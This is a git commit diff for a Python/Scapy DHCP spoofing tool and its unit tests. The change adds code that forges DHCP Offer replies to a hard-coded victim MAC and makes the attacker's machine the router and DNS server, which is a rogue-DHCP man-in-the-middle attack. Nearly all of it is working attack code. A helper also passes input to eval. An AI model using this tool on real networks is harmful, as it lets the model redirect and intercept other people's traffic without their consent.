d78c5913920688d0edcdc8a7b39b558293b1d2f4
Your Name <you@example.com>
2022-01-07 14:38:07 +0000

    WIP: Added Offer message - working

--- dhcp_spoof.py
+++ dhcp_spoof.py
@@ -21,22 +21,25 @@ IP_BROADCAST        = '255.255.255.255'
 DHCP_CLIENT_PORT    = 68 
 DHCP_SERVER_PORT    = 67
 
+
 class DHCP_FLAGS:
     # OP
     BOOTREQUEST=1
     BOOTREPLY=2
 
     # htype
-    HTYPE_RES=1
+    HTYPE_DEF=1
 
     # hlen
-    HTYPE_RES=6
+    HTYPE_LEN_DEF=6
+
 
 # Checks if a packet has DHCP layers
 def is_dhcp_layers(pack):
     # Filter by layers
     return pack.haslayer(DHCP) and pack.haslayer(BOOTP) and pack.haslayer(UDP)\
     and pack.haslayer(IP) and pack.haslayer(Ether)
+
 
 # Checks if a packet is DHCP type discover
 def is_discover_filter(pack):
@@ -50,8 +53,10 @@ def is_discover_filter(pack):
 
     return False
 
+
 def is_mac_valid(x):
     return bool(re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", x.lower()))
+
 
 def is_ip_valid(x):
     try:
@@ -62,9 +67,14 @@ def is_ip_valid(x):
     
     return False
 
+
 def escape(reason):
     print(reason)
     sys.exit(1)
+
+
+mac_to_bytes = lambda mac: (eval('0x'+''.join([x for x in mac if x != ':']))).to_bytes(6, byteorder='big')
+
 
 def print_help():
     print('dhcp-spoof attacker_mac attacker_ip [flags]')
@@ -72,23 +82,81 @@ def print_help():
     print('Flags: ')
     print('\t-h,  help')
 
-def build_offer_message(discover):
-    global my_mac, my_ip
-
+def build_offer_message(discover, my_mac, my_ip, free_ip):
     to_mac = discover[Ether].src
-    from_mac = my_mac
+
+    # Add Ether
+    frame = Ether(src=my_mac, dst=to_mac)
+
+    # Add IP with the free address
+    frame /= IP(src=my_ip, dst=free_ip)
+
+    # Add Transportation layer
+    frame /= UDP(sport=DHCP_SERVER_PORT, dport=DHCP_CLIENT_PORT)
+
+    # Add legacy BOOTP layer
+    frame /= BOOTP()
+
+    # Change BOOTP options
+    frame[BOOTP].op = DHCP_FLAGS.BOOTREPLY
+    frame[BOOTP].htype = DHCP_FLAGS.HTYPE_DEF
+    frame[BOOTP].hlen = DHCP_FLAGS.HTYPE_LEN_DEF
+    frame[BOOTP].xid = discover[BOOTP].xid
+    frame[BOOTP].secs = 0
+    frame[BOOTP].flags = None
+    frame[BOOTP].ciaddr = '0.0.0.0'
+    frame[BOOTP].yiaddr = free_ip
+    frame[BOOTP].siaddr = my_ip
+    frame[BOOTP].giaddr = '0.0.0.0'
+    frame[BOOTP].chaddr = mac_to_bytes(discover[Ether].src)
+
+    # Add DHCP Extension
+    frame /= DHCP()
+
+    # Change DHCP fields
+    
+    opts = [('message-type', 2),\
+            ('server_id', my_ip),\
+            ('lease_time', 43200),\
+            ('renewal_time', 21600),\
+            ('rebinding_time', 37800),\
+            ('subnet_mask', '255.255.255.0'),\
+            ('broadcast_address', '192.168.1.255'),\
+            ('router', my_ip),\
+            ('name_server', my_ip),\
+            ('domain', b'lan'),\
+            'end']\
+
+    # Set options
+    frame[DHCP].options = opts
+
+    return frame
+
 
 # Prints an example discovery
 def handle_DHCP_discover(pack):
+    global my_mac, my_ip
+   
     print('Got Discover from ----> ', end='')
     print(pack[Ether].src)
 
+    if pack[Ether].src == 'd8:f8:83:90:de:d1':
+        print('=-=-=-=- Sending Offer =-=-=-=-')
+
+        current_offer = build_offer_message(pack, my_mac, my_ip, '192.168.1.127')
+
+        srp1(current_offer)[0].show()
+        exit(0)
+
 
 def main():
+    global my_mac, my_ip
+
     if len(sys.argv) != 3 or '-h' in sys.argv:
         print_help()
     else:
         my_mac, my_ip = sys.argv[1], sys.argv[2]
+
         if not(is_mac_valid(my_mac) and is_ip_valid(my_ip)):
             print('Invalid IP or MAC')
             exit(1)
--- testing.py
+++ testing.py
@@ -13,22 +13,88 @@ import re
 import socket
 
 # Module imports
-from dhcp_spoof import build_offer_message
+from dhcp_spoof import (build_offer_message, is_discover_filter)
+
+def get_discover():
+    if get_discover.disc is not None:
+        return get_discover.disc
+    else:
+        discover = Ether(src='11:22:33:44:55:66', dst='ff:ff:ff:ff:ff:ff') / IP(src='0.0.0.0', dst='255.255.255.255')\
+        / UDP(sport=68, dport=67) / BOOTP()
+
+        discover[BOOTP].op = 1
+        discover[BOOTP].htype = 1
+        discover[BOOTP].hlen = 6
+        discover[BOOTP].hops = 0
+        discover[BOOTP].xid = 123456
+        discover[BOOTP].secs = 0
+        discover[BOOTP].flags = None
+
+        opts = [('message-type', 1),\
+                ('client_id', b'\x01\xd8\xf8\x83\x90\xde\xd1'),\
+                ('requested_addr', '192.168.1.127'),\
+                ('hostname', b'DESKTOP-L1VH27D'),\
+                ('vendor_class_id', b'MSFT 5.0'),\
+                ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),\
+                'end']
+
+        discover /= DHCP(options=opts)
+
+        get_discover.disc = discover
+        return discover
+
+get_discover.disc = None
 
 class TestDHCPSpoof(unittest.TestCase):
-    def test_upper(self):
-        self.assertEqual('foo'.upper(), 'FOO')
+    def test_is_discover_filter__regular(self):
+        discover = get_discover()
 
-    def test_isupper(self):
-        self.assertTrue('FOO'.isupper())
-        self.assertFalse('Foo'.isupper())
+        self.assertEqual(is_discover_filter(discover), True)
 
-    def test_split(self):
-        s = 'hello world'
-        self.assertEqual(s.split(), ['hello', 'world'])
-        # check that s.split fails when the separator is not a string
-        with self.assertRaises(TypeError):
-            s.split(2)
+
+    def test_build_offer_message__regular(self):
+        discover = get_discover()
+
+        mac, ip = '11:22:33:44:55:66', '192.168.1.100'
+
+        offer = build_offer_message(discover, mac, ip, '2.2.2.2')
+
+        # Check MACs
+        self.assertEqual(offer[Ether].dst, discover[Ether].src)
+        self.assertEqual(offer[Ether].src, mac)
+
+        # Check IPs are not specific
+        self.assertEqual(offer[IP].src, ip)
+        self.assertTrue(offer[IP].dst != '255.255.255.255')
+        self.assertTrue(offer[IP].dst != '0.0.0.0')
+
+        # Check UDP
+        self.assertEqual(offer[UDP].sport, 67)
+        self.assertEqual(offer[UDP].dport, 68)
+
+        # Check BOOTP
+        self.assertEqual(offer[BOOTP].op, 2)
+        self.assertEqual(offer[BOOTP].xid, discover[BOOTP].xid)
+
+        # Check DHCP
+        opts = offer[DHCP].options
+
+        # Check headers
+        for x in opts:
+            if x[0] == 'message-type':
+                self.assertEqual(x[1], 2)
+                break
+
+        headers = [x[0] for x in opts]
+
+        self.assertTrue('server_id'         in headers)
+        self.assertTrue('lease_time'        in headers)
+        self.assertTrue('subnet_mask'       in headers)
+        self.assertTrue('broadcast_address' in headers)
+        self.assertTrue('router'            in headers)
+        self.assertTrue('name_server'       in headers)
+
+
 
 if __name__ == '__main__':
     unittest.main()
